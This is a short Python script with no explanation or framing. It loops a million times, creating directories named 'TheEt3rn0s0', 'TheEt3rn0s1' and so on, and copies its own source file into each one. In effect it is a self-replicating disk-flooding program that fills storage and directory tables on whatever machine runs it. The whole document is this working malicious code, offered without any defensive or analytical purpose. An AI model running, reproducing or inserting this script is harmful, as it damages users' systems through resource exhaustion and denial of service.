import sys
import shutil
import os
import time




path = "TheEt3rn0s"
actual_file = sys.argv[0]

for x in range(1000000):
    pathh = path + str(x)
    os.mkdir(pathh)
    shutil.copy(actual_file,pathh)
    
